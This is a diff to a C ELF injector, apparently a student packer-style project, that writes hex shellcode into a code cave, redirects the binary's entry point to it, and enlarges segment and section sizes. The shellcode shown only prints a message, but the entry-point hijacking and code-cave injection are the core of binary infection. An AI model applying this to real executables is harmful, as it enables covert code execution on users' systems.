@@ -2,10 +2,20 @@
 
 //char	shellcode[]			= "\x48\x31\xc0\xb0\x01\xbf\x01\x00\x00\x00\x48\x8d\x35\x13\x00\x00\x00\xba\x0f\x00\x00\x00\x0f\x05\x48\x31\xc0\xb0\x3c\xbf\x2a\x00\x00\x00\x0f\x05\x2e\x2e\x2e\x2e\x57\x4f\x4f\x44\x59\x2e\x2e\x2e\x2e\x0a\x0d";
 //char shellcode [] ="\x52\xb8\x0a\x00\x00\x00\x50\x48\xb8\x20\x4d\x65\x73\x73\x61\x67\x65\x50\x48\xb8\x49\x6e\x6a\x65\x63\x74\x65\x64\x50\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\x89\xe6\xba\x11\x00\x00\x00\x0f\x05\x58\x58\x58\x5a\xe9\x16\x10\x00\x00";
-char shellcode[] = "\x52\xb8\x0a\x00\x00\x00\x50\x48\xb8\x20\x4d\x65\x73\x73\x61\x67\x65\x50\x48\xb8\x49\x6e\x6a\x65\x63\x74\x65\x64\x50\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\x89\xe6\xba\x11\x00\x00\x00\x0f\x05\x58\x58\x58\x5a\xb8\x50\x10\x00\x00\xff\xe0";
+//char shellcode[] = "\x52\xb8\x0a\x00\x00\x00\x50\x48\xb8\x20\x4d\x65\x73\x73\x61\x67\x65\x50\x48\xb8\x49\x6e\x6a\x65\x63\x74\x65\x64\x50\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\x89\xe6\xba\x11\x00\x00\x00\x0f\x05\x58\x58\x58\x5a\xb8\x50\x10\x00\x00\xff\xe0";
 
-char mov[] = {0x48, 0xc7, 0xc0, 0x50, 0x10, 0x00, 0x00};
-char jmp[] = {0xff, 0xe0};
+//char mov[] = {0x48, 0xc7, 0xc0, 0x50, 0x10, 0x00, 0x00};
+//char jmp[] = {0xff, 0xe0};
+
+//shellcode = mov + jmp;
+char shellcode[] = {
+	// mov
+	0x48, 0xc7, 0xc0, 0x50, 0x10, 0x00, 0x00,
+	// jmp
+	0xff, 0xe0
+};
+
+
 
 static void patch_jump(char *code, uintptr_t target_address) {
     uintptr_t jump_address = (uintptr_t)code + sizeof(shellcode) - 5; // Address of the jmp instruction
@@ -101,8 +111,7 @@ static int	inject_payload(void) {
 	if (phdr == NULL)
 		return handle_error("No codecave found\n");
 
-
-	Elf64_Shdr	*shdr = get_section_by_name(data, ".fini");
+	Elf64_Shdr	*shdr = get_section_by_address(data, phdr->p_vaddr);
 	if (shdr == NULL)
 		return handle_error("No .text section found\n");
 
@@ -119,19 +128,25 @@ static int	inject_payload(void) {
 
 	printf("Old entrypoint: %lx\n", old_entry);
 
-
-	memcpy(data->_file_map + codecave_offset, shellcode, shellcode_size);
-	//patch_jump(shellcode, old_entry);
-
-	const uintptr_t page_size = 4096;
-	if (mprotect((void *)((uintptr_t)&ehdr->e_entry & ~(uintptr_t)4095), 4096, PROT_READ | PROT_WRITE) == -1)
-		handle_syscall("mprotect", -1);
+	// increase the size of the .text section
 	
-
 	ehdr->e_entry = codecave_offset;
 	phdr->p_filesz += shellcode_size;
 	phdr->p_memsz += shellcode_size;
 	shdr->sh_size += shellcode_size;
+
+	printf("patching at %lx\n", codecave_offset);
+
+
+	memcpy(data->_file_map + codecave_offset, shellcode, shellcode_size);
+
+	//patch_jump(shellcode, old_entry);
+
+	//const uintptr_t page_size = 4096;
+	//if (mprotect((void *)((uintptr_t)&ehdr->e_entry & ~(uintptr_t)4095), 4096, PROT_READ | PROT_WRITE) == -1)
+	//	handle_syscall("mprotect", -1);
+	
+
 
 	patch_new_file(data);
 
